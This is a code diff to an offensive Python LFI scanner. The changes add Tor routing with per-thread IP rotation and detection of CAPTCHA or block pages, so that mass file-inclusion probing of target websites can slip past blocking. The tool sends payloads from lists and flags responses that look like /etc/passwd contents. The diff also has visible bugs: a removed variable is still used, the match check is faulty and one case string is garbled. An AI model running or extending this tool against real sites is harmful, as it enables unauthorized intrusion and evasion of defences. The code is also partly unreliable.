@@ -10,12 +10,12 @@ from requests.exceptions import RequestException
 import random
 from threading import Lock
 import json
+import tor_manager
 
 if os.name == "nt":
-    os.system("cls")
+	os.system("cls")
 else:
-    os.system("clear")
-
+	os.system("clear")
 
 print("""
 
@@ -29,7 +29,7 @@ print("""
  ▀█████▀    ███    █▀           █████▄▄██   ███        █▀   
                                    
 
-Made by: Apollyon 
+Made by: Apollyon, azuk4r 
 Based on: LFIScanner by R3LI4NT                       
 """)
 parse = argparse.ArgumentParser()
@@ -42,10 +42,17 @@ parse.add_argument('-t','--threads',help="Threads [5 by default]",default=5,requ
 parse.add_argument('-pr','--proxy',help="Add a list of proxies to use [HTTP, HTTPS, SOCKS]",required=False)
 parse.add_argument('-auth','--authentication',help="Load headers and/or cookies from a file to run a scan while authenticated",required=False,default="auth.json")
 parse.add_argument('-save','--save_to_file',help="Save working LFI payloads by writing them to a file",required=False,default="LFI_scanner_saves.txt")
+parse.add_argument('--tor', help="Use Tor for connections", action='store_true', required=False)
+parse.add_argument('--tor-rotation', help="Rotate Tor IP every N requests", type=int, required=False)
 parse = parse.parse_args()
 
 lock = Lock()
 
+if parse.tor:
+	print("[~] Starting Tor service...")
+	tor_manager.clean_up()
+	tor_manager.start_tor_service()
+	print("[?] Tor service started.")
 
 def payload_counter(payload_file_path):
 	with open(payload_file_path, 'rb+') as f:
@@ -64,69 +71,99 @@ def load_internal_payloads(payload_path):
 		print("[X] SPECIFIED PAYLOADS NOT FOUND. PLEASE REINSTALL TOOL OR PAYLOAD FILE")
 		quit()
 
-def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract):
+def check_single_url_with_payload(x, payloads_per_thread, payload_path, target_url, cookies, headers, save_file_path, to_extract):
 	global proxies_but_dict
 	global proxy_running
 	payloads = load_internal_payloads(payload_path)
 	
 	payload_count = 0
 	pointer_line = 0
-	print(f"Thread number {x+1} launched on URL {target_url} Checking payloads ...")
-	last_msg_was_error = False
+	failure_count = 0
+	print(f"[~] Thread {x+1} | Running on URL: {target_url} | Checking payloads...")
+
+	if parse.tor:
+		print(f"[~] Thread {x+1} | Starting Tor instance...")
+		tor_manager.create_tor_instance(x+1)
+		print(f"[?] Thread {x+1} | Tor instance started.")
+		if parse.tor_rotation:
+			rotation_counter = 0
+
 	for p in payloads:
 		try:
-			if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread): 
+			if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread):
 				p = p.strip()
 
-				if proxy_running:
-					query = requests.get(target_url+p , headers=headers , proxies=random.choice(proxies_but_dict), cookies=cookies)
-				else:
-					query = requests.get(target_url+p , headers=headers, cookies=cookies)
+				if parse.tor:
+					if failure_count >= 5:
+						print(f"[~] Thread {x+1} | Too many failed attempts, rotating Tor IP...")
+						tor_manager.rotate_tor_ip(x+1)
+						print(f"[?] Thread {x+1} | Tor IP rotated.")
+						failure_count = 0
 
-				payload_count = payload_count + 1
-				if payload_count%25 == 0:
-					print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Checked {payload_count} payloads...")
-				if "root" and "bash" and r"/bin" in query.text and query.status_code//100 == 2:
-					print("="*10)
+					proxies = tor_manager.configure_proxies_for_thread(x+1)
+					query = requests.get(target_url+p, headers=headers, proxies=proxies, cookies=cookies)
+
+					if parse.tor_rotation:
+						rotation_counter += 1
+						if rotation_counter >= parse.tor_rotation:
+							print(f"[~] Thread {x+1} | Rotating Tor IP...")
+							try:
+								tor_manager.rotate_tor_ip(x+1)
+								print(f"[?] Thread {x+1} | Tor IP rotated.")
+							except Exception as e:
+								print(f"[!] Retry rotating Tor IP for thread {x+1} after failure: {e}")
+								try:
+									tor_manager.rotate_tor_ip(x+1)
+									print(f"[~] Thread {x+1} | Tor IP rotated.")
+								except Exception as e:
+									print(f"[!] Thread {x+1}: Failed to rotate Tor IP: {e}")
+							rotation_counter = 0
+				elif parse.proxy:
+					if proxy_running:
+						query = requests.get(target_url+p, headers=headers, proxies=random.choice(proxies_but_dict), cookies=cookies)
+					else:
+						query = requests.get(target_url+p, headers=headers, cookies=cookies)
+				else:
+					query = requests.get(target_url+p, headers=headers, cookies=cookies)
+
+				if "captcha" in query.text.lower() or "denied" in query.text.lower() or "please wait" in query.text.lower():
+					print('[X] CAPTCHA OR BLOCK DETECTED.')
+					time.sleep(10)
+
+				payload_count += 1
+				if payload_count % 25 == 0:
+					print(f"[+] Thread {x+1} | Running on URL: {target_url} | Status: Checked {payload_count} payloads...")
+				if "root" and "bash" and r"/bin" in query.text and query.status_code // 100 == 2:
+					print("=" * 10)
 					print(f"LFI DETECTED:\n URL + Payload: {target_url+p}\n\n")
 					if to_extract:
-						e = BeautifulSoup(query.text,'html5lib')
+						e = BeautifulSoup(query.text, 'html5lib')
 						print(e.blockquote.text)
 					if save_file_path:
-						if os.path.isfile(save_file_path):
-							lock.acquire()
-							with open(save_file_path , "a") as save_file:
-								save_file.write(target_url+p)
-								save_file.write("\n")
-							lock.release()
-						else:
-							lock.acquire()
-							with open(save_file_path , "w") as save_file:
-								save_file.write(target_url+p)
-								save_file.write("\n")
-							lock.release()
+						lock.acquire()
+						with open(save_file_path, "a") as save_file:
+							save_file.write(target_url+p + "\n")
+						lock.release()
 						print(f"LFI DETECTED: Saved to save file \n")
-					print("="*10)
-			pointer_line = pointer_line + 1
-			last_msg_was_error = False
+					print("=" * 10)
+				failure_count = 0
+			pointer_line += 1
 		except RequestException:
-			if not last_msg_was_error:
-				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occured while making request")
-				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status:  Sleeping for 3 seconds then retrying payloads untill error is resolved ...")
-				last_msg_was_error = True
-				time.sleep(3)
-			else:
-				time.sleep(3)
+			failure_count += 1
+			print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occurred while making request")
+			print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Sleeping for 3 seconds then retrying payloads until error is resolved ...")
+			time.sleep(3)
 		except NameResolutionError:
+			failure_count += 1
 			if not last_msg_was_error:
-				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status:  Error occured while resolving domain name. Are you sure the specified website exists and you are connected to the internet ?")
-				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status:  Sleeping for 3 seconds then retrying payloads untill error is resolved ...")
+				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occurred while resolving domain name. Are you sure the specified website exists and you are connected to the internet?")
+				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Sleeping for 3 seconds then retrying payloads until error is resolved ...")
 				last_msg_was_error = True
 				time.sleep(3)
 			else:
 				time.sleep(3)
 
-def use_payload(x,payloads_per_thread,payload_path,target_url,targets_path,cookies,headers,save_file_path,to_extract):
+def use_payload(x, payloads_per_thread, payload_path, target_url, targets_path, cookies, headers, save_file_path, to_extract):
 	if not target_url:
 		if os.path.isfile(url_list_path):
 			with open(url_list_path) as targets_file:
@@ -137,16 +174,16 @@ def use_payload(x,payloads_per_thread,payload_path,target_url,targets_path,cooki
 							pass
 						else:
 							target = r"https://" + target
-						check_single_url_with_payload(x,payloads_per_thread,payload_path,target,cookies,headers,save_file_path,to_extract)
+						check_single_url_with_payload(x, payloads_per_thread, payload_path, target, cookies, headers, save_file_path, to_extract)
 		else:
 			print("[X] NO TARGET URL SPECIFIED")
 			quit()
 	else:
-		check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract)
+		check_single_url_with_payload(x, payloads_per_thread, payload_path, target_url, cookies, headers, save_file_path, to_extract)
 
 def count_payloads(payload_input):
 	match payload_input:
-		case "all_os" | "all_os.txt" | "allos" | "allos.txt" | "1":
+		case "all_os" | "all_os.txt" | "allos" | "allos.all_os.txt" | "1":
 			print("[*] USING PAYLOADS FOR ALL OS SERVERS")
 			payload_path = "all_os.txt"
 			payload_count = payload_counter(payload_path)
@@ -166,8 +203,6 @@ def count_payloads(payload_input):
 				quit()
 
 	return payload_count , payload_path
-
-
 
 global proxies_but_dict
 global proxy_running
@@ -204,15 +239,14 @@ def load_proxies(proxy_path):
 		print("[X] PROXY FILE PATH DOES NOT EXIST")
 		quit()
 
-
 if parse.proxy:
 	load_proxies(parse.proxy.lower())
 
 headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
-		"Accept-Language": "en-US,en;q=0.6",
-		"Accept-Encoding": "gzip, deflate, br, zstd"
-    }
+	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0',
+	"Accept-Language": "en-US,en;q=0.6",
+	"Accept-Encoding": "gzip, deflate, br, zstd"
+}
 cookies = {}
 #default headers
 
@@ -234,8 +268,6 @@ def load_authentication(auth_path , headers , cookies):
 
 if parse.authentication:
 	load_authentication(parse.authentication , headers , cookies)
-
-
 
 if not parse.wizard:
 	if parse.payload:
@@ -263,7 +295,6 @@ if not parse.wizard:
 
 		payloads_per_thread = payload_count//int(parse.threads)
 		
-
 		for x in range(int(parse.threads)):
 			threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers,save_file_path,to_extract)).start()	
 	else:
@@ -370,15 +401,11 @@ else:
 				case _:
 					to_extract = False
 
-
-			payloads_per_thread = payload_count//threads_count
+			payloads_per_thread = payload_count // threads_count
 
 			for x in range(threads_count):
-				threading.Thread(target=use_payload, args=(x,payloads_per_thread,payload_path,current_target,False,cookies,headers,save_file_path,to_extract)).start()	
+				threading.Thread(target=use_payload, args=(x, payloads_per_thread, payload_path, current_target, False, cookies, headers, save_file_path, to_extract)).start()
 
 		case _:	
 			print("[X] NOT A VALID OPTION PLEASE RE LAUNCH THE PROGRAM AND SELECT AN AVAILABLE OPTION")
 			quit()
-			
-
-	
